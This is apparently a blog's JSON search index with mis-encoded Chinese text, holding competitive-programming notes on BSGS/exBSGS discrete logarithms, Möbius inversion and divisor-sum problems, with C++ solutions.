ï¼Œé‚£ä¹ˆåªéœ€è¦è€ƒè™‘ $x \\in [0,\\varphi(p)-1]$ å³å¯ï¼Œä¸ºäº†ç®€ä¾¿é¿å…ç®—æ¬§æ‹‰å‡½æ•°ï¼Œæˆ‘ä»¬å¯¹æ¬§æ‹‰å‡½æ•°è¿›è¡Œæ”¾ç¼© $\\varphi(p) \\le p + 1$ï¼Œé‚£å°±æ˜¯æšä¸¾ $x \\in [0,p]$ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯¹æš´åŠ›æšä¸¾çš„ç®—æ³•åšä¸€ä¸ªä¼˜åŒ–ï¼šä»¤ $x =kt-y$ $,k=\\lfloor \\sqrt{p} \\rfloor +1$ï¼Œåˆ™åŸå¼ä¸º $$a^{kt}\\equiv ba^{y} (\\text{ mod }p)$$ $y$ çš„èŒƒå›´æ˜¯ $[0,k-1]$ ï¼Œæ‰€ä»¥å¯ä»¥æšä¸¾æ¯ä¸ª $y$ ï¼Œé¢„å¤„ç†å³è¾¹çš„å€¼ï¼Œæ’å…¥åˆ°ä¸€ä¸ªå“ˆå¸Œè¡¨ä¸­ï¼Œå†æšä¸¾å·¦è¾¹çš„ $t\\in[1,k]$ å¦‚æœä»å“ˆå¸Œè¡¨æ‰¾åˆ°å€¼ï¼Œé‚£ä¹ˆå°±æ˜¯ç­”æ¡ˆï¼Œç‰¹åˆ¤ $t=0$ çš„æƒ…å†µï¼Œæ—¶é—´å¤æ‚åº¦ $O(\\sqrt{p})$ ","date":"2021-07-25","objectID":"/posts/cpbsgsexbsgs/:1:0","tags":["æ•°è®º"],"title":"BSGSã€exBSGS","uri":"/posts/cpbsgsexbsgs/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; int a, b, p; int bsgs(int a, int b, int p) { if (1 % p == b % p) return 0; int k = sqrt(p) + 1; unordered_map\u003cint, int\u003e mp; for (int i = 0, j = b % p; i \u003c k; i ++) { mp[j] = i; j = j * a % p; } int ak = 1; for (int i = 0; i \u003c k; i ++) ak = ak * a % p; for (int i = 1, j = ak; i \u003c= k; i ++) { if (mp.count(j)) return i * k - mp[j]; j = j * ak % p; } return -1; } signed main() { while (cin \u003e\u003e a \u003e\u003e p \u003e\u003e b, a || b || p) { int res = bsgs(a, b, p); if (res == -1) { cout \u003c\u003c \"No Solution\" \u003c\u003c endl; } else { cout \u003c\u003c res \u003c\u003c endl; } } } ","date":"2021-07-25","objectID":"/posts/cpbsgsexbsgs/:2:0","tags":["æ•°è®º"],"title":"BSGSã€exBSGS","uri":"/posts/cpbsgsexbsgs/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"$\\text{exBSGS}:$ ç»™å®šæ­£æ•´æ•° $a,b,p$ ï¼Œ$a,p$ ä¸ä¸€å®šäº’è´¨ï¼Œæ±‚æ»¡è¶³ $$a^{x} \\equiv b(\\text{ mod } p)$$ çš„æœ€å°éè´Ÿæ•´æ•° $x$ åˆ†æƒ…å†µæ¥çœ‹ï¼Œå¦‚æœ $x=0$ æ—¶ï¼Œæ»¡è¶³ $1 \\equiv b(\\text{ mod } p)$ï¼Œç­”æ¡ˆå°±æ˜¯ $0$ å¦‚æœ $\\gcd(a,p)=1$ï¼Œé‚£ä¹ˆå°±ç›´æ¥ç”¨æœ´ç´  $\\text{BSGS}$ ç®—æ³• å¦‚æœ $\\gcd(a,p) \u003e 1$ï¼Œç”±è£´èœ€å®šç†å¾— $$a^x+kp = b$$ è®¾ $\\gcd(a,p)=d$ï¼Œå¦‚æœ$d\\nmid p$ é‚£ä¹ˆæ— è§£ï¼Œå¦åˆ™ï¼Œç­‰å¼ä¸¤è¾¹åŒé™¤ $d$ å¾— $$\\frac{a}{d}a^{x-1}+k\\frac{p}{d} = \\frac{b}{d}$$ ç­‰ä»·äºåŒä½™æ–¹ç¨‹ï¼š $$\\frac{a}{d}a^{x-1} \\equiv\\frac{b}{d} (\\text{ mod }\\frac{p}{d})$$ ç”±äº $\\gcd(\\frac{a}{d},\\frac{p}{d})=1$ ï¼Œæ‰€ä»¥æŠŠ $\\frac{a}{d}$ ç§»åˆ°ç­‰å¼å³è¾¹ï¼Œå°±æ˜¯ä¹˜ $\\frac{a}{d}$ çš„é€†å…ƒ $$a^{x-1} \\equiv\\frac{b}{d} (\\frac{a}{d})^{-1}(\\text{ mod }\\frac{p}{d})$$ ç”¨æ–°å˜é‡æ›¿æ¢ï¼š $$ (a')^{x} \\equiv b' \\pmod {p'} $$ ç”±äº $x \\ge 1$ï¼Œè¿™æ ·å°±å¯ä»¥é€’å½’åœ°ç”¨ $\\text{BSGS}$ æ±‚è§£äº†ï¼Œæ–°çš„è§£å°±ä¸º $x+1$ï¼Œé€†å…ƒå¯ä»¥ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚è§£ã€‚ ","date":"2021-07-25","objectID":"/posts/cpbsgsexbsgs/:3:0","tags":["æ•°è®º"],"title":"BSGSã€exBSGS","uri":"/posts/cpbsgsexbsgs/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; int a, b, p; int exgcd(int a, int b, int\u0026 x, int\u0026 y) { if (!b) { x = 1, y = 0; return a; } int d = exgcd(b, a % b, y, x); y -= a / b * x; return d; } int bsgs(int a, int b, int p) { if (1 % p == b % p) return 0; int k = sqrt(p) + 1; unordered_map\u003cint, int\u003e mp; for (int i = 0, j = b % p; i \u003c k; i ++) { mp[j] = i; j = j * a % p; } int ak = 1; for (int i = 0; i \u003c k; i ++) ak = ak * a % p; for (int i = 1, j = ak; i \u003c= k; i ++) { if (mp.count(j)) return i * k - mp[j]; j = j * ak % p; } return -1; } int exbsgs(int a, int b, int p) { b = (b % p + p) % p; if (1 % p == b % p) return 0; int x, y; int d = exgcd(a, p, x, y); if (d \u003e 1) { if (b % d) return -2e9; exgcd(a / d, p / d, x, y); return exbsgs(a, b / d * x % (p / d), p / d) + 1; } return bsgs(a, b, p); } signed main() { while (cin \u003e\u003e a \u003e\u003e p \u003e\u003e b, a || b || p) { int res = exbsgs(a, b, p); if (res \u003c 0) { cout \u003c\u003c \"No Solution\" \u003c\u003c endl; } else { cout \u003c\u003c res \u003c\u003c endl; } } } ","date":"2021-07-25","objectID":"/posts/cpbsgsexbsgs/:4:0","tags":["æ•°è®º"],"title":"BSGSã€exBSGS","uri":"/posts/cpbsgsexbsgs/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜ç›®é“¾æ¥ é¢˜æ„ï¼š è®¾ $d(x)$ ä¸º $x$ çš„çº¦æ•°ä¸ªæ•°ï¼Œæ±‚ $$\\sum_{i=1}^{N}\\sum_{j=1}^{M} d(ij)$$ åˆ†æï¼š é¦–å…ˆ $i=p_1 ^{\\alpha_1}\\cdots p_k^{\\alpha_k},j=p_1 ^{\\beta_1}\\cdots p_k^{\\beta_k},iÃ—j=p_1 ^{\\alpha_1+\\beta_1}\\cdots p_k^{\\alpha_k+\\beta_k}$ çº¦æ•°ä¸ªæ•°å’Œä¸º $$d(ij)=(\\alpha_1+\\beta_1+1)\\cdots(\\alpha_k+\\beta_k+1)=\\alpha_1\\beta_2+\\cdots + 1$$ æ‰€ä»¥$$d(ij)=\\sum_{x|i}\\sum_{y|j}[\\gcd(x,y)=1]$$ æ‰€ä»¥åŸå¼ä¸º $$\\sum_{i=1}^{N}\\sum_{j=1}^{M}\\sum_{x|i}\\sum_{y|j}[\\gcd(x,y)=1]$$ è®¾ $g(n)$ ä¸ºï¼š $$g(n)=\\sum_{i=1}^{N}\\sum_{j=1}^{M}\\sum_{x|i}\\sum_{y|j}[n\\mid\\gcd(x,y)]$$ è®¾ $f(n)$ ä¸ºï¼š $$\\sum_{i=1}^{N}\\sum_{j=1}^{M}\\sum_{x|i}\\sum_{y|j}[\\gcd(x,y)=n]$$ åˆ™æœ‰ $$g(n)=\\sum_{n\\mid d} f(d)$$ é‚£ä¹ˆå°±å¯ä»¥è«æ¯”ä¹Œæ–¯åæ¼”äº† $$f(n)=\\sum_{n\\mid d}\\mu(\\frac{d}{n})g(d)$$ äº¤æ¢ $g(n)$ çš„æ±‚å’Œæ¬¡åº ç”±äº $x,y$ åˆ†åˆ«æ˜¯ $i,j$ çš„çº¦æ•°ï¼Œæ‰€ä»¥å¯ä»¥å…ˆæšä¸¾ $x,y$ é‚£ä¹ˆåé¢çš„ $[n \\mid \\gcd(x,y)]$ ä¸ $i,j$ æ— å…³ä¸éœ€è¦è€ƒè™‘ï¼Œæ‰€ä»¥åªéœ€è¦è®¡ç®— $i$ ä¸­æœ‰å¤šå°‘ $x$ çš„å€æ•°ï¼Œ $j$ ä¸­æœ‰å¤šå°‘ $y$ çš„å€æ•°ï¼Œæ‰€ä»¥æ˜¯ $\\lfloor \\frac{N}{x} \\rfloor \\lfloor \\frac{M}{y} \\rfloor$ æ‰€ä»¥å¼å­å°±å˜ä¸ºäº† $$\\sum_{x=1}^{N}\\sum_{y=1}^{M}\\lfloor \\frac{N}{x} \\rfloor \\lfloor \\frac{M}{y} \\rfloor[n \\mid \\gcd(x,y)]$$ $[n \\mid \\gcd(x,y)]$ åªéœ€è¦å…³å¿ƒ $n$ çš„å€æ•°å³å¯ï¼Œé‚£ä¹ˆå°±æ˜¯ $$xâ€™=\\frac{x}{n},yâ€™=\\frac{y}{n}$$ æ›¿æ¢å¾— $$\\sum_{xâ€™=1}^{\\frac{N}{n}}\\sum_{yâ€™=1}^{\\frac{M}{n}} \\lfloor\\frac{N}{nxâ€™} \\rfloor \\lfloor\\frac{M}{nyâ€™} \\rfloor$$ è®¾ $$Nâ€™=\\frac{N}{n},Mâ€™=\\frac{M}{n}$$ åˆ™ $$\\sum_{xâ€™=1}^{Nâ€™}\\sum_{yâ€™=1}^{Mâ€™} \\lfloor\\frac{Nâ€™}{xâ€™} \\rfloor \\lfloor\\frac{Mâ€™}{yâ€™} \\rfloor$$ å‡è®¾æœ‰äºŒé‡ç§¯åˆ† $$\\iint_{D}f(x,y)\\text{d}x\\text{d}y$$ å½“åŒºåŸŸ $D$ ä¸ºçŸ©å½¢åŒºåŸŸæ—¶ï¼Œå¯ä»¥è½¬ä¸ºäºŒæ¬¡ç§¯åˆ† $$\\int_{D_1}f(x,y)\\text{d}x\\int_{D_2}f(x,y)\\text{d}y$$ é‚£ä¹ˆåŸå¼å¯ä»¥å˜ä¸º $$\\sum_{xâ€™=1}^{Nâ€™}\\lfloor\\frac{Nâ€™}{xâ€™} \\rfloor \\sum_{yâ€™=1}^{Mâ€™}\\lfloor\\frac{Mâ€™}{yâ€™} \\rfloor$$ è®¾ $$h(x)=\\sum_{i=1}^{x}\\lfloor\\frac{x}{i} \\rfloor$$ é‚£ä¹ˆ $$f(n)=\\sum_{n\\mid d}\\mu(\\frac{d}{n})g(d)$$ ç­”æ¡ˆä¸º $$f(1)=\\sum_{d=1}^{N}\\mu(d)g(d)$$ å¸¦å…¥ $g(d)$ $$\\sum_{i=1}^{\\min(N,M)}\\mu(i)h(\\lfloor \\frac{N}{i} \\rfloor)h(\\lfloor \\frac{M}{i} \\rfloor)$$ å¯ä»¥ç”¨æ•´é™¤åˆ†å—è®¡ç®—ï¼Œ$h(x)$ ä¹ŸåŒæ ·å¯ä»¥ç”¨æ•´é™¤åˆ†å—é¢„å¤„ç†ã€‚ ","date":"2021-07-23","objectID":"/posts/cpsdoi2015-%E7%BA%A6%E6%95%B0%E4%B8%AA%E6%95%B0%E5%92%8C/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"[SDOI2015] çº¦æ•°ä¸ªæ•°å’Œ","uri":"/posts/cpsdoi2015-%E7%BA%A6%E6%95%B0%E4%B8%AA%E6%95%B0%E5%92%8C/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cstdio.h\u003e #include \u003calgorithm\u003e #define int long long using namespace std; const int N = 5e4 + 5; int T, n, m, primes[N], mobius[N], cnt, sum[N], h[N]; bool st[N]; void get_mobius(int n) { mobius[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; primes[j] * i \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = sum[i - 1] + mobius[i]; } void get_h(int n) { for (int i = 1; i \u003c= n; i ++) { for (int l = 1, r; l \u003c= i; l = r + 1) { r = min(i, i / (i / l)); h[i] += (r - l + 1) * (i / l); } } } signed main() { get_mobius(N - 1), get_h(N - 1); scanf(\"%lld\", \u0026T); while (T --) { scanf(\"%lld%lld\", \u0026n, \u0026m); int res = 0, k = min(n, m); for (int l = 1, r; l \u003c= k; l = r + 1) { r = min(k, min(n / (n / l), m / (m / l))); res += (sum[r] - sum[l - 1]) * h[n / l] * h[m / l]; } printf(\"%lld\\n\", res); } } ","date":"2021-07-23","objectID":"/posts/cpsdoi2015-%E7%BA%A6%E6%95%B0%E4%B8%AA%E6%95%B0%E5%92%8C/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"[SDOI2015] çº¦æ•°ä¸ªæ•°å’Œ","uri":"/posts/cpsdoi2015-%E7%BA%A6%E6%95%B0%E4%B8%AA%E6%95%B0%E5%92%8C/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜æ„ï¼š æ±‚ $$\\sum_{i=a}^{b}\\sum_{j=c}^{d}[\\gcd(i,j)=k]$$ åˆ†æï¼š ç”¨äºŒç»´å‰ç¼€å’Œçš„æ€æƒ³ï¼ŒæŠŠç­”æ¡ˆåˆ†ä¸º$4$ä¸ªéƒ¨åˆ† $$ä»¤S(x,y)=\\sum_{i=1}^{x}\\sum_{j=1}^{y}[\\gcd(i,j)=k]$$ åˆ™ $$\\sum_{i=a}^{b}\\sum_{j=b}^{d}[\\gcd(i,j)=k]=S(b,d)-S(a-1,d)-S(b,c-1)+S(a-1,c-1)$$ é—®é¢˜è½¬åŒ–ä¸ºæ±‚ $S(x,y)$ æ„é€  $$f(n)=\\sum_{i=1}^{x}\\sum_{j=1}^{y}[n|\\gcd(i,j)]$$ $$g(n)=\\sum_{i=1}^{x}\\sum_{j=1}^{y}[\\gcd(i,j)=n]$$ å¯ä»¥å‘ç° $$f(n)=\\sum_{n \\mid d}g(d)$$ æ‰€ä»¥å°±å¯ä»¥è«æ¯”ä¹Œæ–¯åæ¼” $$g(n)=\\sum_{n \\mid d}\\mu(\\frac{d}{n})f(d)$$ $$\\because d\\mid\\gcd(i,j),\\therefore d\\mid i,d \\mid j$$ $$\\therefore f(d)=\\lfloor\\frac{x}{d}\\rfloor\\lfloor\\frac{y}{d}\\rfloor$$ $$g(n)=\\sum_{n \\mid d}\\mu(\\frac{d}{n})\\lfloor\\frac{x}{d}\\rfloor\\lfloor\\frac{y}{d}\\rfloor$$ è®¾ $$t=\\frac{d}{n},d=nt$$ åˆ™ $$g(n)=\\sum_{t=1}^{\\min(x,y)}\\mu(t)\\lfloor\\frac{x}{nt}\\rfloor\\lfloor\\frac{y}{nt}\\rfloor$$ æ‰€ä»¥åªéœ€è¦æ±‚ $g(k)$ï¼Œå¯ä»¥æšä¸¾ $t$ï¼Œç”¨æ•´é™¤åˆ†å—ï¼ŒåŠ ä¸Šç­›è«æ¯”ä¹Œæ–¯å‡½æ•°å‰ç¼€å’Œï¼Œæ—¶é—´å¤æ‚åº¦ $O(N+T\\sqrt n)$ ","date":"2021-07-22","objectID":"/posts/cphaoi2011-problem-b/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"[HAOI2011] problem b","uri":"/posts/cphaoi2011-problem-b/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; const int N = 5e5 + 5; int T, a, b, c, d, k, mobius[N], primes[N], cnt, sum[N]; bool st[N]; void get_mobius(int n) { mobius[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; primes[j] * i \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = sum[i - 1] + mobius[i]; } int f(int x, int y) { int res = 0; for (int l = 1, r; l \u003c= min(x, y); l = r + 1) { r = min(x / (x / l), y / (y / l)); res += (sum[r] - sum[l - 1]) * ((x / k) / l) * ((y / k) / l); } return res; } signed main() { get_mobius(N - 1); cin \u003e\u003e T; while (T --) { cin \u003e\u003e a \u003e\u003e b \u003e\u003e c \u003e\u003e d \u003e\u003e k; cout \u003c\u003c f(b, d) - f(a - 1, d) - f(b, c - 1) + f(a - 1, c - 1) \u003c\u003c endl; } } ","date":"2021-07-22","objectID":"/posts/cphaoi2011-problem-b/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"[HAOI2011] problem b","uri":"/posts/cphaoi2011-problem-b/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å‰ç½®çŸ¥è¯†1:æ•´é™¤åˆ†å— ","date":"2021-07-22","objectID":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"è«æ¯”ä¹Œæ–¯åæ¼”","uri":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"$â‘ :\\lfloor \\dfrac{a}{bc} \\rfloor = \\lfloor \\dfrac{\\lfloor \\dfrac{a}{b} \\rfloor}{c} \\rfloor$ è¯æ˜ï¼š $$\\dfrac{a}{b}=\\lfloor \\dfrac{a}{b}\\rfloor + r,r\\in[0,1)$$ $$\\lfloor \\dfrac{a}{bc} \\rfloor = \\lfloor \\dfrac{a}{b} Â·\\dfrac{1}{c} \\rfloor$$ $$=\\lfloor \\dfrac{1}{c}Â·(\\lfloor \\dfrac{a}{b}\\rfloor + r)\\rfloor$$ $$=\\lfloor \\dfrac{\\lfloor \\dfrac{a}{b} \\rfloor}{c}+\\dfrac{r}{c} \\rfloor$$ $$\\because r\u003cc$$ $$\\therefore \\lfloor \\dfrac{\\lfloor \\dfrac{a}{b} \\rfloor}{c}+\\dfrac{r}{c} \\rfloor=\\lfloor \\dfrac{\\lfloor \\dfrac{a}{b} \\rfloor}{c} \\rfloor$$ ","date":"2021-07-22","objectID":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/:2:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"è«æ¯”ä¹Œæ–¯åæ¼”","uri":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"$â‘¡:i \\in [1,n],|\\lfloor \\dfrac{n}{i}\\rfloor| \\le 2 \\sqrt{n}$ è¯æ˜ï¼š å½“ $i \\in[1,\\lfloor \\sqrt n\\rfloor]$ æ—¶ï¼Œ$\\lfloor \\dfrac{n}{i} \\rfloor$æœ‰$\\lfloor \\sqrt n\\rfloor$ç§å–å€¼ å½“ $i\\in(\\lfloor \\sqrt n\\rfloor, n]$ æ—¶ï¼Œ$\\lfloor \\dfrac{n}{i} \\rfloor\\le \\lfloor \\sqrt n\\rfloor$ï¼Œæœ‰$\\lfloor \\sqrt n\\rfloor$ç§å–å€¼ ","date":"2021-07-22","objectID":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/:3:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"è«æ¯”ä¹Œæ–¯åæ¼”","uri":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"$â‘¢:$ å¯¹ $\\lfloor\\dfrac{n}{i}\\rfloor$ æ±‚å’Œï¼Œ $\\forall i\\in[1,n]$ åªéœ€è¦æ‰¾åˆ°æœ€å¤§çš„ä¸€ä¸ª $j(i \\le j \\le n)$ï¼Œä½¿å¾— $\\lfloor\\dfrac{n}{i}\\rfloor=\\lfloor\\dfrac{n}{j}\\rfloor$ï¼Œæ­¤æ—¶ $j=\\lfloor\\dfrac{n}{\\lfloor\\dfrac{n}{j}\\rfloor}\\rfloor$ è¯æ˜ï¼š å…ˆè¯æ˜ $j \\ge i$ï¼š $$\\lfloor \\dfrac{n}{i}\\rfloor \\le \\dfrac{n}{i} $$ $$\\Leftrightarrow \\lfloor\\dfrac{n}{\\lfloor\\dfrac{n}{i}\\rfloor}\\rfloor \\ge \\lfloor\\dfrac{n}{\\dfrac{n}{i}}\\rfloor = \\lfloor i \\rfloor=i$$ $$\\Leftrightarrow i \\le \\lfloor\\dfrac{n}{\\lfloor\\dfrac{n}{i}\\rfloor}\\rfloor =j$$ å†è¯æ˜æœ€å¤§å€¼ è®¾ $k=\\lfloor\\dfrac{n}{i}\\rfloor$ï¼Œåˆ™ $$k \\le \\dfrac{n}{j} \u003ck + 1$$ $$\\dfrac{1}{k + 1} \u003c \\dfrac{j}{n} \\le \\dfrac{1}{k}$$ $$\\dfrac{n}{k + 1} \u003c j \\le \\dfrac{n}{k}$$ å› ä¸º $j$ æ˜¯æ•´æ•°ï¼Œæ‰€ä»¥æœ€å¤§å€¼ä¸º $\\lfloor \\dfrac{n}{k}\\rfloor$ æ‰€ä»¥æ¯æ¬¡å°† $[i,j]$ åˆ†ä¸ºä¸€å—æ±‚è§£ç´¯åŠ åˆ°ç­”æ¡ˆä¸Š ","date":"2021-07-22","objectID":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/:4:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"è«æ¯”ä¹Œæ–¯åæ¼”","uri":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š for (int l = 1, r; l \u003c= n; l = r + 1) { r = n / (n / l); res += (r - l + 1) * (n / l); } ","date":"2021-07-22","objectID":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/:5:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"è«æ¯”ä¹Œæ–¯åæ¼”","uri":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å‰ç½®çŸ¥è¯†2ï¼šè«æ¯”ä¹Œæ–¯å‡½æ•° å®šä¹‰ï¼š è®¾ $n=p_1^{c_1}\\cdots p_k^{c_k}$ $$\\mu(n)=\\begin{cases} 0,\u0026\\exists i \\in[1,k],c_i \u003e1 \\\\ 1,\u0026k \\equiv 0\\pmod2,\\forall i \\in[1,k],c_i=1\\\\ -1,\u0026k\\equiv1\\pmod2,\\forall i\\in [1,k],c_i=1 \\end{cases}$$ æ€§è´¨ï¼š $$\\sum_{d|n}\\mu(d) = \\begin{cases} 1,\u0026n=1\\\\ 0,\u0026n\u003e1 \\end{cases}$$ è¯æ˜ï¼š $$å–n=\\prod_{i=1}^{k}p_i$$ $$\\sum_{d|n}\\mu(d)=\\sum_{i=0}^{k}C_{k}^{i}Â·(-1)^i$$ $$=(1+(-1))^k=0(äºŒé¡¹å¼å®šç†)$$ ","date":"2021-07-22","objectID":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/:6:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"è«æ¯”ä¹Œæ–¯åæ¼”","uri":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"çº¿æ€§ç­›è«æ¯”ä¹Œæ–¯å‡½æ•°ï¼š void get_mobius(int n) { mobius[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; primes[j] * i \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } } ","date":"2021-07-22","objectID":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/:7:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"è«æ¯”ä¹Œæ–¯åæ¼”","uri":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"è«æ¯”ä¹Œæ–¯åæ¼”ï¼š è®¾ $f(n),g(n)$ ä¸ºä¸¤ä¸ªæ•°è®ºå‡½æ•° å½¢å¼ä¸€ï¼š å¦‚æœ $$f(n)=\\sum_{d|n}g(d)$$ åˆ™æœ‰ $$g(n)=\\sum_{d|n}\\mu(d)f(\\dfrac{n}{d})$$ è¯æ˜ï¼š å°† $$f(n)=\\sum_{d|n}g(d)$$ å¸¦å…¥ $$\\sum_{d|n}\\mu(d)f(\\dfrac{n}{d})$$ å¾— $$\\sum_{d|n}\\mu(d)\\sum_{k \\mid \\frac{n}{d}}g(k)$$ äº¤æ¢æ±‚å’Œæ¬¡åºï¼š å› ä¸º $k \\mid \\dfrac{n}{d}$ ï¼Œé‚£ä¹ˆ $k$ ä¹Ÿæ˜¯ $n$ çš„å› å­ï¼Œæ‰€ä»¥æšä¸¾ $n$ çš„æ‰€æœ‰å› å­ $d$ ç­‰ä»·äºæšä¸¾ $k$ï¼Œ$k \\mid \\dfrac{n}{d}=d \\mid \\dfrac{n}{k}$ æ‰€ä»¥ $$\\sum_{k|n}g(k)\\sum_{d|\\frac{n}{k}}\\mu(d)$$ æ ¹æ® $\\sum_{d \\mid n}\\mu(d)=[n=1]$ æ‰€ä»¥ $n=k$ï¼Œæ‰€ä»¥ $$\\sum_{k|n}g(k)\\sum_{d \\mid \\frac{n}{k}}\\mu(d)=g(n)$$ è¯æ¯•ã€‚ å½¢å¼äºŒ(å¸¸ç”¨)ï¼š å¦‚æœ $$f(n)=\\sum_{n|d}g(d)$$ åˆ™æœ‰ $$g(n)=\\sum_{n|d}\\mu(\\dfrac{d}{n})f(d)$$ è¯æ˜ï¼š å°† $$f(n)=\\sum_{n|d}g(d)$$ å¸¦å…¥ $$\\sum_{n|d}\\mu(\\dfrac{d}{n})f(d)$$ å¾— $$\\sum_{n|d}\\mu(\\dfrac{d}{n})\\sum_{d|k}g(k)$$ äº¤æ¢æ±‚å’Œæ¬¡åºï¼š $$\\sum_{n|k}g(k)\\sum_{\\frac{d}{n}|\\frac{k}{n}}\\mu(\\dfrac{d}{n})$$ æ ¹æ® $\\sum_{d|n}\\mu(d)=[n=1]$ æ‰€ä»¥ $n=k$ï¼Œæ‰€ä»¥ $$\\sum_{n|k}g(k)\\sum_{\\frac{d}{n} \\mid \\frac{k}{n}}\\mu(\\dfrac{d}{n})=g(n)$$ è¯æ¯•ã€‚ ","date":"2021-07-22","objectID":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/:8:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"è«æ¯”ä¹Œæ–¯åæ¼”","uri":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åæ¼”æŠ€å·§ $$\\sum_{i=1}^{n} f(i) \\sum_{j=1}^{m}g(j)=\\sum_{j=1}^{m}g(j)\\sum_{i=1}^{n}f(i)$$ $$\\sum_{i=1}^{n} f(i) \\sum_{d \\mid i}g(d)=\\sum_{d=1}^{n}g(d)\\sum_{i=1}^{\\lfloor \\frac{n}{d} \\rfloor}f(id)$$ ","date":"2021-07-22","objectID":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/:9:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"è«æ¯”ä¹Œæ–¯åæ¼”","uri":"/posts/cp%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94/"},{"categories":["å¼€å‘"],"content":"è¢«æŸæ•°æ®ç»“æ„è€å¸ˆè¯´ç®€å•ã€‚ã€‚ã€‚ã€‚ã€‚ #include \u003cbits/stdc++.h\u003e //ä¸‡èƒ½å¤´ #include \u003cwindows.h\u003e //è°ƒç”¨Sleep()éœ€è¦ using namespace std; //å‘½åç©ºé—´ const int N = 1e5 + 5; //æœ€å¤§æ•°ç»„ç©ºé—´ int version, idx, log_id, history_id; //versionè¡¨ç¤ºç°åœ¨ç‰ˆæœ¬ idxè¡¨ç¤ºidå· log_idè¡¨ç¤ºæ—¥å¿—id history_idè¡¨ç¤ºå†å²id string Your_pos, Content, op; //opè¡¨ç¤ºå½“å‰æ“ä½œ Your_posè¡¨ç¤ºä½ çš„èŒä½ 